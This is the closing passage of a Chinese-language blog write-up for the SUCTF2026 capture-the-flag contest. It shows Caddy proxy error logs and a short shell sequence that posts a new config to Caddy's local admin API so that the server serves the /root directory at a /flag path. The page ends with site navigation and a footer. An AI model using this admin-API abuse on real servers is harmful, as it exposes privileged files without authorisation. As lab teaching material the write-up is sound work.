response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000877268,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;23.249.17.216&quot;,&quot;remote_port&quot;:&quot;8877&quot;,&quot;client_ip&quot;:&quot;23.249.17.216&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/openapi3.json&quot;,&quot;headers&quot;:&#123;&quot;User-Agent&quot;:[&quot;curl/8.18.0&quot;],&quot;Accept&quot;:[&quot;*/*&quot;],&quot;X-Forwarded-For&quot;:[&quot;23.249.17.216&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;23.249.17.216:8877: write: broken pipe&quot;&#125;</span><br><span class="line">&#123;&quot;level&quot;:&quot;error&quot;,&quot;ts&quot;:1773474450.2921264,&quot;logger&quot;:&quot;http.handlers.reverse_proxy&quot;,&quot;msg&quot;:&quot;aborting with incomplete response&quot;,&quot;upstream&quot;:&quot;127.0.0.1:3000&quot;,&quot;duration&quot;:0.000973672,&quot;request&quot;:&#123;&quot;remote_ip&quot;:&quot;23.249.17.216&quot;,&quot;remote_port&quot;:&quot;11751&quot;,&quot;client_ip&quot;:&quot;23.249.17.216&quot;,&quot;proto&quot;:&quot;HTTP/1.1&quot;,&quot;method&quot;:&quot;GET&quot;,&quot;host&quot;:&quot;156.239.26.40:13334&quot;,&quot;uri&quot;:&quot;/public/api-merged.json&quot;,&quot;headers&quot;:&#123;&quot;Accept&quot;:[&quot;*/*&quot;],&quot;User-Agent&quot;:[&quot;curl/8.18.0&quot;],&quot;X-Forwarded-For&quot;:[&quot;23.249.17.216&quot;],&quot;X-Forwarded-Proto&quot;:[&quot;http&quot;],&quot;X-Forwarded-Host&quot;:[&quot;156.239.26.40:13334&quot;]&#125;&#125;,&quot;error&quot;:&quot;writing: write tcp 172.17.0.3:80-&gt;23.249.17.216:11751: write: broken pipe&quot;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">先把新的 Caddy 配置写到 /tmp</span></span><br><span class="line">echo &#x27;&#123;&quot;apps&quot;:&#123;&quot;http&quot;:&#123;&quot;servers&quot;:&#123;&quot;srv0&quot;:&#123;&quot;listen&quot;:[&quot;:80&quot;],&quot;routes&quot;:[&#123;&quot;match&quot;:[&#123;&quot;path&quot;:[&quot;/flag&quot;]&#125;],&quot;handle&quot;:[&#123;&quot;handler&quot;:&quot;file_server&quot;,&quot;root&quot;:&quot;/root&quot;&#125;]&#125;,&#123;&quot;handle&quot;:[&#123;&quot;handler&quot;:&quot;reverse_proxy&quot;,&quot;upstreams&quot;:[&#123;&quot;dial&quot;:&quot;127.0.0.1:3000&quot;&#125;]&#125;]&#125;]&#125;&#125;&#125;&#125;&#125;&#x27; &gt;/tmp/caddy_pwn.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">加载</span></span><br><span class="line">curl -s -X POST http://127.0.0.1:2019/load -H &#x27;Content-Type: application/json&#x27; --data-binary @/tmp/caddy_pwn.json</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">访问</span></span><br><span class="line">curl -s http://127.0.0.1/flag</span><br></pre></td></tr></table></figure></div>
+
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20260314160059420.png"
+                      alt="image-20260314160059420"
+                ></p>
+<h1 id="AI"><a href="#AI" class="headerlink" title="AI"></a>AI</h1><h2 id="SU-theif"><a href="#SU-theif" class="headerlink" title="SU_theif"></a>SU_theif</h2><p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../images/image-20260314140732229.png"
+                      alt="image-20260314140732229"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> SUCTF2026 WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2026-03-16 21:32:24</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-03-30 09:56:44
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2026/03/16/SUCTF2026 WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2026/04/19/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E8%85%BE%E8%AE%AF%E4%BA%91%E9%BB%91%E5%AE%A2%E6%9D%BE%E6%99%BA%E8%83%BD%E6%B8%97%E9%80%8F%E6%8C%91%E6%88%98%E8%B5%9B%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%8F%8D%E6%80%9D/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">第二届腾讯云黑客松智能渗透挑战赛学习与反思</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2026/03/10/DesCTF2026-WP/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">DesCTF2026 WP</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">SUCTF2026 WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SU-sqli"><span class="nav-text">SU_sqli</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP"><span class="nav-text">EXP</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SU-Thief"><span class="nav-text">SU_Thief</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#AI"><span class="nav-text">AI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#SU-theif"><span class="nav-text">SU_theif</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
